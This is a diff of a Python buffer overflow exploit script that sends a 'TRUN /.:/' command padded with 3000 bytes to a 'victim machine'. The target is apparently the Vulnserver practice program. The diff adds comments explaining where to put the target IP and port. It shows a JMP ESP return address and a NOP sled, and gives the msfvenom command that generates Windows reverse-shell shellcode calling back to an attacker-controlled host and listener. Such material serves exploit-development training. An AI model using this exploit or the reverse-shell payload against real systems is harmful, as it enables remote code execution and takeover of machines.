@@ -4,11 +4,11 @@ import sys, socket
 
 buff = "TRUN /.:/"
 
-buff += "A" * 3000
+buff += "A" * 3000  #Checking if prog crashes 
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-s.connect(('ip',9000))
+s.connect(('ip', port)) #Provide ip & port of the victim machine  port = port on which the vuln prog is running-- Can be checked using >> netstat -anop tcp
 
 print s.recv(1024)
 
@@ -43,7 +43,7 @@ buf += "\xAF\x11\x50\x62"  #PIPE attached : JMP ESP ADDRESS
 
 buf += "\x90" * 10  #NOP for safety
 
-# Below is a shellcode created using msfvenom : ( Remember to add + to the--->  buf =  b""   ---> buf += b"" )
+# Below is a shellcode created using msfvenom : ( Remember to add + to the--->  buf =  b""   ---> buf += b"" )  . see line 51 .
 # Shellcode is created using : 
 # msfvenom -p windows/shell_reverse_tcp_ LHOST=<kali_ip> LPORT=<port_on_which_nc_is_listening> -b "\x00" -f python -a x86
 
